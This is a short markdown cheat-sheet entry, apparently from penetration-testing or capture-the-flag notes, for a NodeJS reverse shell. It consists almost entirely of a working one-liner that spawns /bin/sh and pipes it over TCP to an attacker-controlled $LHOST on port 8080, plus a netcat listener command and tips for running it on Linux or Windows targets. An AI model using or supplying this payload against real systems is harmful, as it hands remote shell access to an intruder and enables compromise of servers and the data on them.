# NodeJS Reverse Shell

A reverse shell payload using NodeJS.

Used on: **<Machine>**

## One-liner

<!-- cmd: cross-platform -->
```javascript
node -e 'var sh = require("child_process").spawn("/bin/sh");var net = require("net");var client = new net.Socket();client.connect(8080, "$LHOST", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Useful if NodeJS is installed on the target. This is very common on modern web servers.
- Works on both Linux and Windows (though on Windows you might need to change `/bin/sh` to `cmd.exe`).
